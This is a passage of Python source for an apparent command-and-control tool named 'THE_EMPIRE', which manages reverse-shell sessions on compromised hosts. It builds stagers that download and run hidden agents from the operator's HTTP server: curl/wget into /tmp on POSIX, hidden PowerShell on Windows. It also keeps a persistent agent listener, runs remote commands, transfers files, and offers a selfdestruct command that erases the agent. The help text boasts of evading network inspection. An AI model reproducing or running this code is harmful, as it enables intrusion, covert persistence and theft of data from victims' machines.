                    "socket": peer, "host": address[0], "port": address[1],
                    "type": "RAW", "connected": True,
                }
            self.log_event("raw_session_added", session=identifier,
                           host=address[0], port=address[1])
            print(f"\n[+] RAW session {identifier} connected: "
                  f"{address[0]}:{address[1]}", flush=True)
            print("[*] Enter 'sessions' to list, 'sessions -i ID' to attach", flush=True)

    def raw_manager_listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(16)
        self.socket.settimeout(0.5)
        proto = "TLS 1.3" if self.use_tls else "RAW"
        print(f"[+] {proto} TCP listener: {self.args.target}:{self.args.port}",
              flush=True)
        print("[+] THE_EMPIRE session manager ready. Type 'help' or 'sessions'.")
        listener = self.socket
        receiver = threading.Thread(target=self._raw_accept_loop,
                                    args=(listener,), daemon=True)
        receiver.start()
        self.socket = None
        try:
            self.command_client()
        finally:
            self._stop_accepting.set()
            try:
                listener.close()
            except OSError:
                pass
            if self._agent_listener is not None:
                try: self._agent_listener.close()
                except OSError: pass
            receiver.join(timeout=2)
            for identifier in list(self.sessions):
                try:
                    self._remove_session(identifier)
                except Exception:
                    pass
            print("[*] Session manager stopped")

    def _register_session(self, sock, host, port):
        with self.sessions_lock:
            identifier = self.next_session_id
            self.next_session_id += 1
            self.sessions[identifier] = {
                "socket": sock, "host": host, "port": port,
                "type": "THE_EMPIRE", "connected": True,
            }
            self.selected_id = identifier
            self.socket = sock
        self.log_event("THE_EMPIRE_session_added", session=identifier,
                       host=host, port=port)
        print(f"[+] THE_EMPIRE session {identifier}: {host}:{port}")
        return identifier

    def _connect_additional(self, host, port):
        sock = socket.create_connection((host, port), timeout=15)
        try:
            sock.settimeout(15)
            sock = self._wrap_connecting(sock, hostname=host)
            client_authenticate(sock)
            mode = decode_frame(recv_frame(sock))
            if mode != "COMMAND":
                raise ConnectionError(
                    f"Multi-session requires a THE_EMPIRE command server, got {mode}")
            sock.settimeout(None)
            return self._register_session(sock, host, port)
        except Exception:
            sock.close()
            raise

    def _attach_raw(self, identifier):
        item = self.sessions.get(identifier)
        if item is None or item.get("type") != "RAW":
            raise ValueError(f"RAW session {identifier} not found")
        peer = item["socket"]
        self.selected_id = identifier
        self.socket = None
        self._raw_detach_requested = False
        old_handler = None
        can_signal = (os.name != "nt" and hasattr(signal, "SIGTSTP"))
        if can_signal:
            old_handler = signal.getsignal(signal.SIGTSTP)
            def detach_signal(_signum, _frame):
                self._raw_detach_requested = True
            signal.signal(signal.SIGTSTP, detach_signal)
        print(f"[*] Attached to RAW session {identifier} "
              f"({item['host']}:{item['port']})", flush=True)
        print("[*] Ctrl+Z: background (Linux/macOS); Ctrl+C: background", flush=True)
        outcome = "background"
        try:
            if os.name == "nt":
                outcome = self._raw_windows_attach(peer)
            else:
                outcome = self.raw_stream(peer)
        except KeyboardInterrupt:
            print("\n[*] Returning to THE_EMPIRE manager", flush=True)
        except (OSError, ConnectionError, ValueError) as exc:
            print(f"\n[!] RAW session {identifier} lost: {exc}")
            outcome = "closed"
        finally:
            if old_handler is not None:
                signal.signal(signal.SIGTSTP, old_handler)
            self._raw_detach_requested = False
            self.selected_id = None
            self.socket = None
        if outcome == "closed":
            self._remove_session(identifier)
        else:
            print(f"[*] Session {identifier} moved to background")

    def _select_session(self, identifier):
        session = self.sessions.get(identifier)
        if session is None:
            raise ValueError(f"Session {identifier} not found")
        if session.get("type") == "RAW":
            self._attach_raw(identifier)
            return
        self.socket = session["socket"]
        self.selected_id = identifier
        print(f"[+] Selected THE_EMPIRE session {identifier}")

    def _background_session(self, identifier=None):
        if identifier is None:
            identifier = self.selected_id
        if identifier is not None and identifier not in self.sessions:
            raise ValueError(f"Session {identifier} not found")
        if self.selected_id == identifier or identifier is None:
            self.selected_id = None
            self.socket = None
        if identifier is not None:
            print(f"[*] Session {identifier} is in background")
        else:
            print("[*] Returned to THE_EMPIRE session manager")

    # ---------------- AGENT LISTENER (persistent, TLS) ----------------
    def _ensure_agent_listener(self):
        listener = getattr(self, "_agent_listener", None)
        if listener is not None:
            return listener, self._agent_port

        port = self.args.upgrade_lport or self._find_free_port()
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(("0.0.0.0", port))
        listener.listen(32)
        listener.settimeout(0.5)

        self._agent_listener = listener
        self._agent_port = port

        def accept_loop():
            while not self._stop_accepting.is_set():
                try:
                    peer, addr = listener.accept()
                except socket.timeout:
                    continue
                except OSError:
                    return
                if self.use_tls:
                    try:
                        peer = self._wrap_accepted(peer)
                    except (ssl.SSLError, OSError) as exc:
                        print(f"[!] Agent TLS handshake failed from "
                              f"{addr[0]}:{addr[1]}: {exc}",
                              file=sys.stderr, flush=True)
                        try: peer.close()
                        except OSError: pass
                        continue
                peer.settimeout(None)
                try:
                    peer.settimeout(20)
                    if not server_authenticate(peer):
                        peer.close()
                        continue
                    peer.settimeout(None)
                    send_frame(peer, b"COMMAND")
                    new_id = self._register_session(peer, addr[0], addr[1])
                    self.log_event("agent_connected", session=new_id,
                                   host=addr[0], port=addr[1])
                    print(f"[+] Agent reconnected: session {new_id} "
                          f"from {addr[0]}:{addr[1]}")
                except Exception as exc:
                    try: peer.close()
                    except Exception: pass
                    print(f"[!] Agent handshake failed: {exc}")

        threading.Thread(target=accept_loop, daemon=True).start()
        proto = "TLS 1.3" if self.use_tls else "plaintext"
        print(f"[+] Persistent agent listener started on 0.0.0.0:{port} ({proto})")
        return listener, port

    # ---------------- UPGRADE HELPERS ----------------
    def _get_local_ip_for(self, peer_ip):
        try:
            probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                probe.connect((peer_ip, 9))
                return probe.getsockname()[0]
            finally:
                probe.close()
        except OSError:
            return "127.0.0.1"

    def _find_free_port(self):
        probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            probe.bind(("", 0))
            return probe.getsockname()[1]
        finally:
            probe.close()

    def _detect_remote_os(self, raw_sock, timeout=4.0):
        raw_sock.settimeout(0.4)
        try:
            while True:
                junk = raw_sock.recv(BUFFER_SIZE)
                if not junk:
                    return None
        except socket.timeout:
            pass
        except (OSError, ConnectionError):
            return None

        try:
            raw_sock.sendall(b"uname -s 2>/dev/null; echo THE_EMPIRE_POSIX_PROBE\n")
        except OSError:
            return None

        raw_sock.settimeout(timeout)
        deadline = time.time() + timeout
        buf = bytearray()
        while time.time() < deadline:
            try:
                chunk = raw_sock.recv(BUFFER_SIZE)
            except socket.timeout:
                break
            except OSError:
                return None
            if not chunk:
                break
            buf.extend(chunk)
            if b"THE_EMPIRE_POSIX_PROBE" in buf:
                break

        text = buf.decode("utf-8", errors="replace")
        if any(tag in text for tag in ("Linux", "Darwin", "BSD", "SunOS")):
            raw_sock.settimeout(None)
            return "posix"

        try:
            raw_sock.sendall(b"ver\r\n")
        except OSError:
            return None

        buf = bytearray()
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                chunk = raw_sock.recv(BUFFER_SIZE)
            except socket.timeout:
                break
            except OSError:
                return None
            if not chunk:
                break
            buf.extend(chunk)
            if b"Windows" in buf or b"Microsoft" in buf:
                break

        raw_sock.settimeout(None)
        text = buf.decode("utf-8", errors="replace")
        if "Windows" in text or "Microsoft" in text:
            return "windows"
        return None

    def _generate_agent_payload(self, lhost, lport):
        use_tls = "True" if self.use_tls else "False"
        return (AGENT_TEMPLATE
                .replace("__LHOST__", lhost)
                .replace("__LPORT__", str(int(lport)))
                .replace("__USE_TLS__", use_tls)
               ).encode("utf-8")

    def _generate_bash_payload(self, lhost, lport):
        use_tls = "True" if self.use_tls else "False"
        return (BASH_AGENT_TEMPLATE
                .replace("__LHOST__", lhost)
                .replace("__LPORT__", str(int(lport)))
                .replace("__USE_TLS__", use_tls)
               ).encode("utf-8")

    def _serve_payload_http(self, python_bytes, bash_bytes=None):
        import http.server

        class Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path in ("/", "/a.py"):
                    data = python_bytes
                    ctype = "text/x-python"
                elif self.path == "/a.sh" and bash_bytes is not None:
                    data = bash_bytes
                    ctype = "text/x-shellscript"
                else:
                    self.send_error(404)
                    return
                self.send_response(200)
                self.send_header("Content-Type", ctype)
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
            def log_message(self, *args, **kwargs):
                pass

        httpd = http.server.ThreadingHTTPServer(("0.0.0.0", 0), Handler)
        port = httpd.server_address[1]
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        return httpd, port

    def _build_upgrade_command(self, os_kind, http_url):
        py_url = http_url
        sh_url = http_url.rsplit("/", 1)[0] + "/a.sh"

        if os_kind == "windows":
            ps = (
                f"$u='{py_url}';"
                f"$o=Join-Path $env:TEMP 'THE_EMPIREagent.py';"
                f"try{{iwr -useb $u -OutFile $o}}"
                f"catch{{(New-Object Net.WebClient).DownloadFile($u,$o)}};"
                f"foreach($p in @('python','py','python3')){{"
                f"try{{Start-Process $p -ArgumentList $o -WindowStyle Hidden -EA Stop; exit}}"
                f"catch{{}}}}"
            )
            return f'powershell -nop -w hidden -c "{ps}"\r\n'.encode("utf-8")

        cmd = (
            f"(curl -fsSL {py_url} -o /tmp/.THE_EMPIRE.py 2>/dev/null "
            f"|| wget -qO /tmp/.THE_EMPIRE.py {py_url} 2>/dev/null) && "
            f"(command -v python3 >/dev/null 2>&1 && "
            f"nohup python3 /tmp/.THE_EMPIRE.py </dev/null >/dev/null 2>&1 & "
            f"exit 0) ; "
            f"(command -v python >/dev/null 2>&1 && "
            f"nohup python /tmp/.THE_EMPIRE.py </dev/null >/dev/null 2>&1 & "
            f"exit 0) ; "
            f"(curl -fsSL {sh_url} -o /tmp/.THE_EMPIRE.sh 2>/dev/null "
            f"|| wget -qO /tmp/.THE_EMPIRE.sh {sh_url} 2>/dev/null) && "
            f"chmod +x /tmp/.THE_EMPIRE.sh && "
            f"nohup /bin/bash /tmp/.THE_EMPIRE.sh </dev/null >/dev/null 2>&1 & "
            f"echo THE_EMPIRE-STAGED\n"
        )
        return cmd.encode("utf-8")

    def _upgrade_session(self, identifier):
        item = self.sessions.get(identifier)
        if item is None:
            raise ValueError(f"Session {identifier} not found")
        if item.get("type") == "THE_EMPIRE":
            self._select_session(identifier)
            print("[*] This session already uses THE_EMPIRE")
            return

        raw_sock = item["socket"]
        peer_host = item["host"]
        lhost = self.args.upgrade_lhost or self._get_local_ip_for(peer_host)

        print()
        print("=" * 70)
        print(f"[*] UPGRADE   session {identifier} ({peer_host})")
        print("=" * 70)

        payload = self._generate_agent_payload(lhost, 0)
        bash_payload = self._generate_bash_payload(lhost, 0)
        httpd, http_port = self._serve_payload_http(payload, bash_payload)

        _, lport = self._ensure_agent_listener()

        payload = self._generate_agent_payload(lhost, lport)
        bash_payload = self._generate_bash_payload(lhost, lport)

        try: httpd.shutdown()
        except Exception: pass
        httpd, http_port = self._serve_payload_http(payload, bash_payload)

        http_url = f"http://{lhost}:{http_port}/a.py"
        print(f"[*] Python agent : {len(payload)} bytes")
        print(f"[*] Bash agent   : {len(bash_payload)} bytes")
        print(f"[*] HTTP delivery: http://{lhost}:{http_port}/")
        proto = "TLS 1.3" if self.use_tls else "plaintext"
        print(f"[*] Reverse target: {lhost}:{lport} ({proto})")

        before = set(self.sessions.keys())

        print("[*] Probing RAW shell for OS type...")
        os_kind = self._detect_remote_os(raw_sock, timeout=4.0)
        if os_kind is None:
            print("[!] OS probe failed - defaulting to POSIX")
            os_kind = "posix"
        else:
            print(f"[+] Detected remote shell: {os_kind}")

        stager = self._build_upgrade_command(os_kind, http_url)
        print("[*] Sending stager through RAW session")
        try:
            raw_sock.sendall(stager)
        except OSError as exc:
            print(f"[!] Failed to send stager: {exc}")
            try: httpd.shutdown()
            except Exception: pass
            return

        print(f"[*] Waiting up to {UPGRADE_TIMEOUT}s for reverse THE_EMPIRE...")
        deadline = time.time() + UPGRADE_TIMEOUT
        new_id = None
        while time.time() < deadline:
            time.sleep(0.5)
            for sid in set(self.sessions.keys()) - before:
                if self.sessions[sid].get("host") == peer_host:
                    new_id = sid
                    break
            if new_id is not None:
                break
        try: httpd.shutdown()
        except Exception: pass

        if new_id is None:
            print("[!] Upgrade timed out - RAW session kept intact")
            return

        print()
        print("=" * 70)
        print("[+] UPGRADE COMPLETE")
        print(f"[+]   Original RAW  : {identifier}")
        print(f"[+]   New THE_EMPIRE agent : {new_id}")
        print("=" * 70)
        print(f"[*] sessions -i {new_id}     interact")
        print(f"[*] sessions -k {identifier}  drop old RAW shell")
        print()

    def _remove_session(self, identifier):
        with self.sessions_lock:
            session = self.sessions.pop(identifier, None)
        if session is None:
            raise ValueError(f"Session {identifier} not found")
        try:
            session["socket"].shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        try:
            session["socket"].close()
        except OSError:
            pass
        if self.selected_id == identifier:
            self.selected_id = None
            self.socket = None
        self.log_event("session_closed", session=identifier,
                       type=session.get("type", "THE_EMPIRE"))
        print(f"[*] Closed session {identifier}")

    def _print_sessions(self):
        with self.sessions_lock:
            snapshot = sorted(self.sessions.items())
        if not snapshot:
            print("[*] No sessions")
            return
        print("ID   TYPE          STATUS       ADDRESS")
        print("-" * 64)
        for identifier, session in snapshot:
            typ = session.get("type", "THE_EMPIRE")
            display_type = "THE_EMPIRE" if typ == "THE_EMPIRE" else typ
            status = ("Closed" if session["socket"].fileno() < 0 else
                      "Selected" if identifier == self.selected_id else
                      "Active")
            address = f"{session['host']}:{session['port']}"
            print(f"{identifier:<4} {display_type:<11} {status:<12} {address}")

    def send(self):
        original = self.socket
        try:
            print(f"[*] Connecting to {self.args.target}:{self.args.port}")
            original.settimeout(120)
            original.connect((self.args.target, self.args.port))
            original = self._wrap_connecting(original,
                                             hostname=self.args.target)
            proto = "TLS 1.3" if self.use_tls else "plaintext"
            print(f"[+] {proto} TCP connection established")
            client_authenticate(original)
            mode = decode_frame(recv_frame(original))
            original.settimeout(None)
            print(f"[+] THE_EMPIRE mode: {mode}")
            if mode == "COMMAND":
                self._register_session(original, self.args.target, self.args.port)
                self.command_client()
            elif mode == "EXECUTE":
                self.print_output(recv_frame(original))
            elif mode == "UPLOAD":
                self.upload_client()
            elif mode == "ECHO":
                self.echo_client()
            else:
                raise ConnectionError(f"Unsupported THE_EMPIRE mode: {mode}")
        except KeyboardInterrupt:
            print("\n[*] Connection interrupted")
        except (OSError, ConnectionError, ValueError, PermissionError,
                json.JSONDecodeError, RuntimeError) as error:
            print(f"\n[!] Client error: {error}")
        finally:
            for identifier in list(self.sessions):
                try:
                    self._remove_session(identifier)
                except Exception:
                    pass
            try:
                original.close()
            except OSError:
                pass
            print("[*] Disconnected")

    def print_output(self, data):
        output = decode_frame(data)
        if output:
            print(output, end="" if output.endswith("\n") else "\n", flush=True)

    def create_prompt_session(self):
        try:
            from prompt_toolkit import PromptSession
            from prompt_toolkit.completion import Completer, Completion
            from prompt_toolkit.shortcuts import CompleteStyle
        except ImportError:
            print("[!] Install prompt_toolkit to enable Tab completion")
            return None
        owner = self
        class THE_EMPIRECompleter(Completer):
            COMMANDS = [
                "cd", "pwd", "dir", "ls", "download", "upload",
                "exit", "quit", "sessions",
                "sessioninfo", "background", "connect", "help",
                "cat", "systeminfo", "whoami", "getuid", "getprivs",
                "getpid", "pid", "selfdestruct",
            ]
            def remote_matches(self, prefix, dirs_only=False):
                sock = owner.socket
                if sock is None:
                    return []
                try:
                    send_packet(sock, {"op": "complete", "prefix": prefix,
                                       "dirs_only": dirs_only})
                    response = recv_packet(sock)
                except (OSError, ValueError, ConnectionError,
                        json.JSONDecodeError):
                    return []
                if not response.get("ok"):
                    return []
                return response.get("matches", [])
            def get_completions(self, document, complete_event):
                line = document.text_before_cursor
                if not line:
                    for command in self.COMMANDS:
                        yield Completion(command, start_position=0)
                    return
                command, separator, argument = line.partition(" ")
                if not separator:
                    seen = set()
                    for name in self.COMMANDS:
                        if name.startswith(command.lower()):
                            seen.add(name.lower())
                            yield Completion(name, start_position=-len(command),
                                             display=name, display_meta="command")
                    try:
                        matches = self.remote_matches(command)
                        for entry in matches:
                            value = entry["value"]
                            if value.lower() in seen:
                                continue
                            seen.add(value.lower())
                            yield Completion(value, start_position=-len(command),
                                             display=value,
                                             display_meta=("directory"
                                                           if entry["directory"]
                                                           else "file"))
                    except (OSError, ValueError, ConnectionError):
                        return
                    return
                command_name = command.lower().strip()
                local_options = {
                    "sessions": ("-i", "-b", "-u", "-k"),
                }
                if command_name in local_options:
                    for option in local_options[command_name]:
                        if option.startswith(argument.lower()):
                            yield Completion(option, start_position=-len(argument))
                    return
                try:
                    if command_name == "upload":
                        matches = local_file_matches(argument)
                    else:
                        matches = self.remote_matches(
                            argument, dirs_only=(command_name == "cd"))
                    for entry in matches:
                        value = entry["value"]
                        is_directory = entry["directory"]
                        if command_name == "cd" and not is_directory:
                            continue
                        if " " in value or argument.startswith('"'):
                            replacement = '"' + value
                            if not is_directory:
                                replacement += '"'
                        else:
                            replacement = value
                        yield Completion(replacement, start_position=-len(argument),
                                         display=value,
                                         display_meta=("directory"
                                                       if is_directory
                                                       else "file"))
                except (OSError, ValueError, ConnectionError):
                    return
        return PromptSession(completer=THE_EMPIRECompleter(),
                             complete_while_typing=False,
                             complete_style=CompleteStyle.READLINE_LIKE)

    def command_client(self):
        print("[+] THE_EMPIRE command console ready")
        print("[*] Type help for commands; Tab completes names if installed")
        if not self.args.raw:
            try:
                self._ensure_agent_listener()
            except Exception as exc:
                print(f"[!] Could not start agent listener: {exc}")

        prompt_session = self.create_prompt_session()
        while True:
            prompt = (f"THE_EMPIRE [Session {self.selected_id}]> "
                      if self.selected_id is not None else "THE_EMPIRE > ")
            try:
                command = (prompt_session.prompt(prompt) if prompt_session
                           else input(prompt))
            except (KeyboardInterrupt, EOFError):
                print()
                command = "exit"
            stripped = command.strip()
            if not stripped:
                continue
            parts = stripped.split()
            name = parts[0].lower()
            if name in ("quit", "exit"):
                break
            if name == "help":
                print()
                print("=" * 78)
                print("  THE_EMPIRE NETCAT — COMMAND REFERENCE")
                print("=" * 78)
                print()
                print("SESSION MANAGEMENT")
                print("  sessions                 List all sessions")
                print("  sessions -i <ID>         Interact with a session (RAW or THE_EMPIRE)")
                print("  sessions -b <ID>         Send a session to background")
                print("  sessions -u <ID>         Upgrade RAW -> THE_EMPIRE agent (HTTP push)")
                print("  sessions -k <ID>         Kill / close a session")
                print("  sessioninfo              Show details of the selected session")
                print("  background (bg)          Return to manager without closing")
                print("  connect HOST PORT        Open a new THE_EMPIRE connection to HOST:PORT")
                print()
                print("FILE TRANSFER (AES-256-GCM over TLS 1.3)")
                print("  download REMOTE_FILE     Download from selected session")
                print("  upload LOCAL_FILE        Upload to selected session")
                print()
                print("LOCAL NAVIGATION  (executes on the target)")
                print("  pwd / cd <dir> / cd ..   Change working directory")
                print("  ls / dir                 List directory contents")
                print("  cat <file> / type        Show file contents")
                print()
                print("COMMAND EXECUTION  (anything else is forwarded to the shell)")
                print("  <command>                e.g. uname -a, ifconfig, ps aux")
                print()
                print("CROSS-PLATFORM ALIASES")
                print("  Linux / macOS                 Windows")
                print("  ls -> ls -lah                 ls -> dir")
                print("  cat -> cat                    cat -> type")
                print("  ifconfig/ip -> ip a           ip -> ipconfig")
                print("  ps -> ps aux                  ps -> tasklist")
                print("  kill -> kill -9               kill -> taskkill /F /IM")
                print("  sysinfo -> uname -a           sysinfo -> systeminfo")
                print()
                print("AGENT LIFECYCLE")
                print("  getpid                   Show current agent PID")
                print("  selfdestruct             Erase agent files and exit")
                print()
                print("MISC")
                print("  help                     This reference")
                print("  quit / exit              Exit the manager")
                print("  Ctrl+C                   Interrupt / break out of a prompt")
                print("  Ctrl+Z                   Detach from RAW session (Linux/macOS)")
                print()
                print("TRANSPORT")
                print("  All traffic is encrypted with TLS 1.3 (AES-256-GCM or")
                print("  ChaCha20-Poly1305). Wireshark shows only TLS records.")
                print("=" * 78)
                print()
                continue
            if name == "sessions":
                if len(parts) == 1:
                    self._print_sessions()
                elif len(parts) == 3 and parts[1] in ("-i", "-b", "-u", "-k"):
                    try:
                        identifier = int(parts[2])
                        if parts[1] == "-i":
                            self._select_session(identifier)
                        elif parts[1] == "-b":
                            self._background_session(identifier)
                        elif parts[1] == "-u":
                            self._upgrade_session(identifier)
                        else:
                            self._remove_session(identifier)
                    except (ValueError, OSError, ConnectionError,
                            RuntimeError) as exc:
                        print(f"[!] {exc}")
                else:
                    print("Usage: sessions [-i|-b|-u|-k] ID")
                continue
            if name in ("background", "bg"):
                self._background_session()
                continue
            if name == "sessioninfo":
                if self.selected_id is None:
                    print("[!] Select a session first")
                else:
                    item = self.sessions[self.selected_id]
                    print(f"Session {self.selected_id}: {item['host']}:{item['port']}")
                    print(f"Transport: {item.get('type', 'THE_EMPIRE').replace('THE_EMPIRE', 'THE_EMPIRE')}")
                    print(f"Encryption: {'TLS 1.3' if self.use_tls else 'NONE (plaintext)'}")
                    print("Authentication: DISABLED")
                continue
            if name == "connect":
                if len(parts) != 3:
                    print("Usage: connect HOST PORT")
                else:
                    try:
                        port = int(parts[2])
                        if not 1 <= port <= 65535:
                            raise ValueError("Port outside 1-65535")
                        self._connect_additional(parts[1], port)
                    except (OSError, ValueError, ConnectionError,
                            PermissionError, RuntimeError) as exc:
                        print(f"[!] Cannot add session: {exc}")
                continue
            if self.socket is None:
                print("[!] No THE_EMPIRE session selected; use sessions -i ID or connect HOST PORT")
                continue
            if name == "selfdestruct":
                try:
                    send_packet(self.socket, {"op": "selfdestruct"})
                    self.socket.settimeout(5)
                    try:
                        resp = recv_packet(self.socket)
                        out = resp.get("output", "")
                        if out:
                            print(out, end="" if out.endswith("\n") else "\n")
                    except socket.timeout:
                        pass
                except Exception:
                    pass
                if self.selected_id is not None:
                    try:
                        self._remove_session(self.selected_id)
                    except Exception:
                        pass
                continue
            try:
                if name == "download":
                    if len(parts) < 2:
                        print("Usage: download REMOTE_FILE")
                    else:
                        self.download_file(stripped.split(None, 1)[1].strip('"'))
                    continue
                if name == "upload":
                    if len(parts) < 2:
                        print("Usage: upload LOCAL_FILE")
                    else:
                        self.upload_file(stripped.split(None, 1)[1].strip('"'))
                    continue
                send_packet(self.socket, {"op": "command", "command": command})
                self.socket.settimeout(60)
                response = None
                try:
                    while True:
                        pkt = recv_packet(self.socket)
                        if pkt.get("op") == "ping" or pkt.get("pong"):
                            continue
                        response = pkt
                        break
                except socket.timeout:
                    print("[!] Command timed out (no response from agent)")
                    self.socket.settimeout(None)
                    continue
                self.socket.settimeout(None)
                if response is None:
                    continue
                if not response.get("ok"):
                    print("[!] " + response.get("error", "Unknown error"))
                else:
                    output = response.get("output", "")
                    if output:
                        print(output, end="" if output.endswith("\n") else "\n")
            except (ConnectionError, OSError, ValueError) as exc:
                print(f"[!] Session error: {exc}")
                if self.selected_id is not None:
                    try:
                        self._remove_session(self.selected_id)
                    except Exception:
                        pass

    def download_file(self, remote_path):
        send_packet(self.socket, {"op": "download", "path": remote_path})
        response = recv_packet(self.socket)
        if not response.get("ok"):
            print("[!] " + response.get("error", "Download failed"))
            return
        filename = response["name"]
        size = response["size"]
        if (not filename or filename in (".", "..")
                or "/" in filename or "\\" in filename):
            send_packet(self.socket, {"ready": False})
            print("[!] Invalid remote filename")
            return
        destination = Path.cwd() / filename
        try:
            output = destination.open("xb")
        except OSError as error:
            send_packet(self.socket, {"ready": False})
            print(f"[!] {error}")
            return
        send_packet(self.socket, {"ready": True})
        checksum = hashlib.sha256()
        remaining = size
        try:
            with output:
                while remaining > 0:
                    chunk = recv_exact(self.socket, min(BUFFER_SIZE, remaining))
                    output.write(chunk)
                    checksum.update(chunk)
                    remaining -= len(chunk)
            result = recv_packet(self.socket)
            if (not result.get("ok")
                    or checksum.hexdigest() != result.get("sha256")):
                raise ValueError("Download checksum mismatch")
            print(f"[+] Downloaded: {destination}")
            print(f"[+] Size: {size} bytes")
            print(f"[+] SHA-256: {checksum.hexdigest()}")
        except Exception:
            output.close()
            destination.unlink(missing_ok=True)
            raise

    def upload_file(self, local_path):
        source = Path(local_path).expanduser()
        if not source.is_file():
            print(f"[!] File not found: {source}")
            return
        size = source.stat().st_size
        if size > MAX_TRANSFER:
            print("[!] File exceeds transfer limit")
            return
        send_packet(self.socket, {"op": "upload",
                                  "name": source.name, "size": size})
        response = recv_packet(self.socket)
        if not response.get("ok"):
            print("[!] " + response.get("error", "Upload failed"))
            return
        checksum = hashlib.sha256()
        remaining = size
        with source.open("rb") as file:
            while remaining > 0:
                chunk = file.read(min(BUFFER_SIZE, remaining))
                if not chunk:
                    raise IOError("Source file changed during upload")
                self.socket.sendall(chunk)
                checksum.update(chunk)
                remaining -= len(chunk)
        result = recv_packet(self.socket)
        if not result.get("ok"):
            print("[!] " + result.get("error", "Upload failed"))
            return
        if checksum.hexdigest() != result.get("sha256"):
            raise ValueError("Upload checksum mismatch")
        print(f"[+] Uploaded: {source.name}")
        print(f"[+] Remote path: {result['saved']}")
        print(f"[+] SHA-256: {checksum.hexdigest()}")

    def echo_client(self):
        print("[+] THE_EMPIRE Echo Session Ready")
        while True:
            try:
                message = input("THE_EMPIRE: #> ")
            except (KeyboardInterrupt, EOFError):
                message = "exit"
            send_frame(self.socket, message)
            response = recv_frame(self.socket)
            self.print_output(response)
            if message.strip().lower() in ("exit", "quit"):
                break

    def upload_client(self):
        filepath = self.args.file
        if not filepath:
            print("[!] Use -f to specify a file")
            return
        if not os.path.isfile(filepath):
            print(f"[!] File not found: {filepath}")
            return
        size = os.path.getsize(filepath)
        if size > MAX_TRANSFER:
            print("[!] File exceeds upload limit")
            return
        self.socket.sendall(struct.pack("!Q", size))
        with open(filepath, "rb") as file:
            while True:
                chunk = file.read(BUFFER_SIZE)
                if not chunk:
                    break
                self.socket.sendall(chunk)
        self.print_output(recv_frame(self.socket))

    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        proto = "TLS 1.3" if self.use_tls else "plaintext"
        print(f"[+] THE_EMPIRE Server listening on {self.args.target}:{self.args.port} ({proto})")
        print("[+] Waiting for connections...")
        try:
            while True:
                client_socket, addr = self.socket.accept()
                print(f"\n[*] Connection from {addr[0]}:{addr[1]}")
                self.log_event("THE_EMPIRE_incoming", host=addr[0], port=addr[1])
                client_thread = threading.Thread(
                    target=self.handle, args=(client_socket, addr), daemon=True
                )
                client_thread.start()
        except KeyboardInterrupt:
            print("\n[*] Server stopped")
        finally:
            try:
                self.socket.close()
            except OSError:
                pass

    def handle(self, client_socket, addr):
        print(f"[+] Client accepted: {addr[0]}:{addr[1]}")
        try:
            if self.use_tls:
                try:
                    client_socket = self._wrap_accepted(client_socket)
                except (ssl.SSLError, OSError) as exc:
                    print(f"[!] TLS handshake failed: {exc}")
                    return
            with client_socket:
                client_socket.settimeout(20)
                server_authenticate(client_socket)
                client_socket.settimeout(None)
                if self.args.execute is not None:
                    mode = "EXECUTE"
                elif self.args.upload is not None:
                    mode = "UPLOAD"
                elif self.args.command:
                    mode = "COMMAND"
                else:
                    mode = "ECHO"
                send_frame(client_socket, mode)
                if mode == "EXECUTE":
                    output = execute(self.args.execute, os.getcwd())
                    send_frame(client_socket, output)
                elif mode == "UPLOAD":
                    self.receive_file(client_socket)
                elif mode == "COMMAND":
                    self.command_session(client_socket)
                else:
                    self.echo_session(client_socket)
        except (OSError, ConnectionError, ValueError) as error:
            print(f"[!] Handler error: {error}")
        finally:
            print(f"[-] Session ended: {addr[0]}:{addr[1]}")

    def command_session(self, client_socket):
        current_dir = os.getcwd()
        while True:
            request = recv_packet(client_socket)
            operation = request.get("op")
            if operation == "complete":
                matches = file_matches(
                    request.get("prefix", ""), current_dir,
                    only_directories=request.get("dirs_only", False))
                send_packet(client_socket, {"ok": True, "matches": matches})
                continue
            if operation == "download":
                self.send_download(client_socket, current_dir,
                                   request.get("path", ""))
                continue
            if operation == "upload":
                self.receive_session_upload(client_socket, current_dir, request)
                continue
            if operation == "command":
                command = request.get("command", "").strip()
                if command.lower() in ("exit", "quit"):
                    send_packet(client_socket, {
                        "ok": True, "output": "[*] Closing connection\n"})
                    return
                response, current_dir = process_command(command, current_dir)
                send_packet(client_socket, {"ok": True, "output": response})
                continue
            send_packet(client_socket, {"ok": False, "error": "Unknown operation"})

    def send_download(self, sock, cwd, remote_path):
        path = resolve_path(cwd, remote_path)
        if not os.path.isfile(path):
            send_packet(sock, {"ok": False, "error": f"File not found: {path}"})
            return
        try:
            with open(path, "rb") as file:
                size = os.fstat(file.fileno()).st_size
                if size > MAX_TRANSFER:
                    send_packet(sock, {"ok": False,
                                       "error": "File exceeds transfer limit"})
                    return
                send_packet(sock, {"ok": True,
                                   "name": os.path.basename(path),
                                   "size": size})
                ready = recv_packet(sock)
                if not ready.get("ready"):
                    return
                checksum = hashlib.sha256()
                remaining = size
                while remaining > 0:
                    chunk = file.read(min(BUFFER_SIZE, remaining))
                    if not chunk:
                        raise ConnectionError("Source changed during download")
                    sock.sendall(chunk)
                    checksum.update(chunk)
                    remaining -= len(chunk)
                send_packet(sock, {"ok": True, "sha256": checksum.hexdigest()})
        except OSError as error:
            print(f"[!] Download error: {error}")
            raise

    def receive_session_upload(self, sock, cwd, request):
        name = request.get("name", "")
        size = request.get("size")
        if (not isinstance(name, str) or not name
                or name in (".", "..")
                or "/" in name or "\\" in name or ":" in name
                or type(size) is not int or size < 0 or size > MAX_TRANSFER):
            send_packet(sock, {"ok": False, "error": "Invalid upload request"})
            return
        destination = os.path.join(cwd, name)
        if os.path.lexists(destination):
            send_packet(sock, {"ok": False, "error": "Destination already exists"})
            return
        try:
            output = open(destination, "xb")
        except OSError as error:
            send_packet(sock, {"ok": False, "error": str(error)})
            return
